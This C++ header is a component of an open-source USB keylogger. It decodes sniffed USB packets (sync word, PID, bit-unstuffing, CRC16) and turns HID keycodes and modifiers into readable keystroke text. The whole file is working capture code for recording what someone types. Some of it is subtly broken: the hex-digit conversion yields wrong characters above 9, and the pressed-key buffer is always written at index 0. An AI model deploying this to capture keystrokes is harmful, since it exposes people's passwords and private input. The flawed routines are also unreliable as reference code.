#ifndef USBHIDDEC_H
#define USBHIDDEC_H

// Decode HID Codes to characters for USB keylogger
// See https://github.com/gereonsuch/keylogger for more information
// Copyright (C) 2026 Gereon Such

// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

class USBHIDDec {
    // if synced, push bits here!
    unsigned char bytes[10];
    unsigned nbit_written {0};
    unsigned onecount = 0;

    unsigned word = 0x3fff; // holds the expected begin
    const unsigned mask = 0x3fff; // 6 bit sync word, 8 bit PID value

    const unsigned _pid_val_a = {0b00000111000011};
    const unsigned _pid_val_b = {0b00000111010010};

public:
    bool isSynced() const { return word == _pid_val_a || word == _pid_val_b; }
    const unsigned char* getBytes() const { return bytes; }
    unsigned getCurrentSyncWord() const { return word; }

    void reset() {
        word = mask;
        resetDecoder();
    }

    bool pushBit(unsigned char bit) {
        if ( isSynced() )
            return pushToSyncBits(bit);

        // else push to word and check against pid values
        word = (((word<<1) ^ static_cast<unsigned>(bit)) & mask);
        return false;
    }

protected:

    void resetDecoder() {
        onecount = 0;
        nbit_written = 0;
    }

    bool pushToSyncBits(unsigned char bit) {
        if (nbit_written <= 0) // at begin
            resetDecoder();

        if (onecount >= 6) { // this bit is discarded since previous 6 bits where all one, i.e. no level change
            onecount = 0;
            return false;
        }

        // de-zeropad
        if (bit)
            onecount++;
        else
            onecount = 0;

        // push bytereversed to bytepos
        unsigned bytepos = (nbit_written >> 3);
        bytes[bytepos]>>=1;
        if (bit) bytes[bytepos] ^= 0x80;
        nbit_written++;

        if (nbit_written >= 80)
            return true;

        return false;
    }

};


/// check the crc16 on 10 bytes with the crc at the end
inline bool checkCRC16(const unsigned char* bytes) {
    unsigned poly = 0x8005u;
    unsigned reg = 0xffffu; // start with all one

    for (unsigned bytepos = 0; bytepos < 8; bytepos++) {
        for (unsigned bitpos = 0; bitpos < 8; bitpos++) {
            unsigned char bit = ((bytes[bytepos] >> bitpos) & 1u);
            unsigned char msb = ((reg & 0x8000u) != 0) ? 1u : 0u;
            reg = ((reg << 1) & 0xffffu);

            if (bit != msb)
                reg ^= poly;
        }
    }
    reg ^= 0xffffu; // invert at end

    unsigned ref_crc = 0;
    for (unsigned bytepos = 8; bytepos < 10; bytepos++) {
        for (unsigned bitpos = 0; bitpos < 8; bitpos++) {
            unsigned char bit = ((bytes[bytepos] >> bitpos) & 1u);
            ref_crc = ((ref_crc << 1u) ^ static_cast<unsigned>(bit));
        }
    }

    return reg == ref_crc;
}

template <unsigned N = 6>
class PressedKeysLookup {
    unsigned char pressed_keys[N];

public:
    PressedKeysLookup() {
        reset();
    }

    void reset() {
        for (unsigned i = 0; i < N; i++)
            pressed_keys[i] = 0;
    }

    void eval(const unsigned char* values, unsigned len, unsigned char* newly_pressed_keys = nullptr, unsigned char* released_keys = nullptr) {
        unsigned char now_pressed_keys[N];
        unsigned num_pressed = 0;

        for (unsigned i = 0; i < len; i++) {
            unsigned char v = values[i];
            if (v == 0) continue;

            if (newly_pressed_keys != nullptr && ! contains<true>(v, pressed_keys, N)) { // pressed_keys is
                *newly_pressed_keys = v;
                newly_pressed_keys++;
            }

            if (num_pressed < N) {
                *now_pressed_keys = v;
                num_pressed++;
            }
        }

        if (released_keys != nullptr) {
            for (unsigned i = 0; i < N; i++) {
                unsigned char v = pressed_keys[i];
                if (v == 0) break;
                if (! contains<false>(v, values, len)) {
                    *released_keys = v;
                    released_keys++;
                }
            }
        }

        // adapt newly_pressed to pressed_keys
        unsigned o = 0;
        for (; o < num_pressed; o++)
            pressed_keys[o] = now_pressed_keys[o];
        for (; o < N; o++)
            pressed_keys[o] = 0; // zero fill at end
    }

protected:
    template <bool break_on_zero = false>
    bool contains(unsigned char value, const unsigned char *p, unsigned len) {
        for (unsigned i = 0; i < len; i++) {
            unsigned char ref = p[i];
            if constexpr (break_on_zero) {
                if (ref == 0)
                    break;
            }
            if (ref == value)
                return true;
        }
        return false;
    }
};

struct ModifierReader {
    bool left_ctrl {false};
    bool left_shift {false};
    bool left_alt {false};
    bool left_gui {false};
    bool right_ctrl {false};
    bool right_shift {false};
    bool right_alt {false};
    bool right_gui {false};

    ModifierReader(unsigned char value) {
        left_ctrl = (value & 0x1) != 0;
        left_shift = (value & 0x2) != 0;
        left_alt = (value & 0x4) != 0;
        left_gui = (value & 0x8) != 0;
        right_ctrl = (value & 0x10) != 0;
        right_shift = (value & 0x20) != 0;
        right_alt = (value & 0x40) != 0;
        right_gui = (value & 0x80) != 0;
    }

    bool ctrl() const { return left_ctrl || right_ctrl; }
    bool shift() const { return left_shift || right_shift; }
    bool alt() const { return left_alt || right_alt; }
    bool gui() const { return left_gui || right_gui; }
};




inline void appendString(char*& output, unsigned& maxlen, char c) {
    if (maxlen > 0) {
        *output = c;
        output++;
        maxlen--;
    }
}

/// \param str must be zero terminated
inline void appendString(char*& output, unsigned& maxlen, const char* str) {
    while (maxlen > 0) {
        char c = *str;
        if (c == '\0') break;
        *output = c;
        output++;
        maxlen--;
        str++;
    }
}

inline void appendKeyNumberAsHex(char*& output, unsigned& maxlen, unsigned char number, const char* preface = "KEY_0x") {
    appendString(output, maxlen, preface);
    char a = ((number >> 4) & 0xf), b = (number & 0xf);
    appendString(output, maxlen, (a >= 10 ? 'a' : '0') + a);
    appendString(output, maxlen, (b >= 10 ? 'a' : '0') + b);
    appendString(output, maxlen, ' ');
}



inline void appendCharFromHIDValue(char* &output, unsigned& maxlen, unsigned char value, const ModifierReader& modifier) {
    if (value == 0) return;

    if (modifier.ctrl())
        appendString(output, maxlen, "CTRL+");
    if (modifier.alt())
        appendString(output, maxlen, "ALT+");
    if (modifier.gui())
        appendString(output, maxlen, "GUI+");

    if (value >= 0x04 && value <= 0x1d) { // chars
        char base = modifier.shift() ? 'A' : 'a';
        char c = base + static_cast<char>(value - 0x04);
        appendString(output, maxlen, c);
        return;
    }

    if (modifier.shift())
        appendString(output, maxlen, "SHIFT+");

    switch (value) { // typical control keys
        case 0x28: appendString(output, maxlen, '\n'); return;
        case 0x29: appendString(output, maxlen, "*ESC*"); return;
        case 0x2a: appendString(output, maxlen, "*BCKSPC*"); return;
        case 0x2b: appendString(output, maxlen, "\t"); return;
        case 0x2c: appendString(output, maxlen, ' '); return; // SPACE

        case 0x46: appendString(output, maxlen, "*PRINTSCREEN*"); return;
        case 0x47: appendString(output, maxlen, "*SCROLLOCK*"); return;
        case 0x48: appendString(output, maxlen, "*PAUSE*"); return;
        case 0x49: appendString(output, maxlen, "*INSERT*"); return;
        case 0x4a: appendString(output, maxlen, "*HOME*"); return;
        case 0x4b: appendString(output, maxlen, "*PAGEUP*"); return;
        case 0x4c: appendString(output, maxlen, "*DELETE*"); return;
        case 0x4d: appendString(output, maxlen, "*END*"); return;
        case 0x4e: appendString(output, maxlen, "*PAGEDOWN*"); return;
        case 0x4f: appendString(output, maxlen, "*RIGHT*"); return;
        case 0x50: appendString(output, maxlen, "*LEFT*"); return;
        case 0x51: appendString(output, maxlen, "*DOWN*"); return;
        case 0x52: appendString(output, maxlen, "*UP*"); return;
        case 0x53: appendString(output, maxlen, "*NUMLOCK*"); return;

        case 0x39: appendString(output, maxlen, "*CAPS*"); return;
        case 0x3a: appendString(output, maxlen, "*F1*"); return;
        case 0x3b: appendString(output, maxlen, "*F2*"); return;
        case 0x3c: appendString(output, maxlen, "*F3*"); return;
        case 0x3d: appendString(output, maxlen, "*F4*"); return;
        case 0x3e: appendString(output, maxlen, "*F5*"); return;
        case 0x3f: appendString(output, maxlen, "*F6*"); return;
        case 0x40: appendString(output, maxlen, "*F7*"); return;
        case 0x41: appendString(output, maxlen, "*F8*"); return;
        case 0x42: appendString(output, maxlen, "*F9*"); return;
        case 0x43: appendString(output, maxlen, "*F10*"); return;
        case 0x44: appendString(output, maxlen, "*F11*"); return;
        case 0x45: appendString(output, maxlen, "*F12*"); return;
        default: break;
    }

    switch (value) { // numbers
        case 0x1e: appendString(output, maxlen, '1'); return;
        case 0x1f: appendString(output, maxlen, '2'); return;
        case 0x20: appendString(output, maxlen, '3'); return;
        case 0x21: appendString(output, maxlen, '4'); return;
        case 0x22: appendString(output, maxlen, '5'); return;
        case 0x23: appendString(output, maxlen, '6'); return;
        case 0x24: appendString(output, maxlen, '7'); return;
        case 0x25: appendString(output, maxlen, '8'); return;
        case 0x26: appendString(output, maxlen, '9'); return;
        case 0x27: appendString(output, maxlen, '0'); return;
        default: break;
    }

    switch (value) { // keypad:
        case 0x54: appendString(output, maxlen, '/'); return;
        case 0x55: appendString(output, maxlen, '*'); return;
        case 0x56: appendString(output, maxlen, '-'); return;
        case 0x57: appendString(output, maxlen, '+'); return;
        case 0x58: appendString(output, maxlen, '\n'); return; // kaypad enter
        case 0x59: appendString(output, maxlen, '1'); return;
        case 0x5a: appendString(output, maxlen, '2'); return;
        case 0x5b: appendString(output, maxlen, '3'); return;
        case 0x5c: appendString(output, maxlen, '4'); return;
        case 0x5d: appendString(output, maxlen, '5'); return;
        case 0x5e: appendString(output, maxlen, '6'); return;
        case 0x5f: appendString(output, maxlen, '7'); return;
        case 0x60: appendString(output, maxlen, '8'); return;
        case 0x61: appendString(output, maxlen, '9'); return;
        case 0x62: appendString(output, maxlen, '0'); return;
        case 0x63: appendString(output, maxlen, '.'); return;
        default: break;
    }

    /*
    case 0x2d: appendString(output, maxlen, shift_modifier ? '_' : '-'); return;
    case 0x2e: appendString(output, maxlen, shift_modifier ? '+' : '='); return;
    case 0x2f: appendString(output, maxlen, shift_modifier ? '{' : '['); return;
    case 0x30: appendString(output, maxlen, shift_modifier ? '}' : ']'); return;
    case 0x31: appendString(output, maxlen, shift_modifier ? '|' : '\\'); return;
    case 0x32: appendString(output, maxlen, shift_modifier ? '~' : '#'); return;
    case 0x33: appendString(output, maxlen, shift_modifier ? ':' : ';'); return;
    case 0x34: appendString(output, maxlen, shift_modifier ? '\'' : '"'); return;
    case 0x35: appendString(output, maxlen, shift_modifier ? '`' : '~'); return;
    case 0x36: appendString(output, maxlen, shift_modifier ? '<' : ','); return;
    case 0x37: appendString(output, maxlen, shift_modifier ? '>' : '.'); return;
    case 0x38: appendString(output, maxlen, shift_modifier ? '?' : '/'); return;
    */

    // unhandled key, append as integer
    appendKeyNumberAsHex(output, maxlen, value);
}


#endif //USBHIDDEC_H
